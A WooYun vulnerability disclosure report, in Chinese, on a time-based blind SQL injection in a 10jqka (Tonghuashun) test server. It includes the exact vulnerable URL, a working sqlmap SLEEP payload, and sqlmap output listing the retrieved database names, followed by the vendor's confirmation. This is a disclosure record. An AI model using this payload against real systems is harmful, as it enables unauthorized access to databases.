wybug_title: 同花顺某站注入（涉及139库）
wybug_detail:
漏洞详情 披露状态：   									2016-04-25：	细节已通知厂商并且等待厂商处理中									2016-04-25：	厂商已经确认，细节仅向厂商公开									2016-05-05：	细节向核心白帽子及相关领域专家公开									2016-05-15：	细节向普通白帽子公开									2016-05-25：	细节向实习白帽子公开									2016-06-09：	细节向公众公开  简要描述： ... 详细说明：  http://testm.10jqka.com.cn/pay/pad_release.php?counturl=http://vaserviece.10jqka.com.cn/macd/index.php?module=count&goto=nwnd&op=goldpay&param=macd&platform=ipad&s_id=206&source=macdd_gbuy1延时

不延时

   漏洞证明：  
Parameter: s_id (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: counturl=http://vaserviece.10jqka.com.cn/macd/index.php?module=count&goto=nwnd&op=goldpay&param=macd&platform=ipad&s_id=206' AND (SELECT * FROM (SELECT( SLEEP (5)))wZsl)and '9565'='9565&source=macdd_gbuy1---[01:41:00] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.6.10back-end DBMS: MySQL 5.0.12[01:41:00] [INFO] fetching database names[01:41:00] [INFO] fetching number of databases[01:41:00] [WARNING] time-based comparison requires larger statistical model, please wait..............................                       [01:41:05] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y139[01:41:55] [INFO] retrieved: information_schema[01:47:00] [INFO] retrieved: 10jqka_ad[01:49:22] [INFO] retrieved: 10jqka_gg[01:51:48] [INFO] retrieved: 10jqka_kh[01:54:14] [INFO] retrieved: 10jqka_mg[01:56:38] [INFO] retrieved: 99test[01:58:17] [INFO] retrieved: APNS[01:59:16] [INFO] retrieved: APNS_BAK[02:01:01] [INFO] retrieved: FUNDTRADING_APNS[02:04:48] [INFO] retrieved: FU^C...
   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-04-25 08:44 厂商回复： 你好，漏洞已确认，是测试服务器，正在处理，谢谢。 最新状态： 暂无
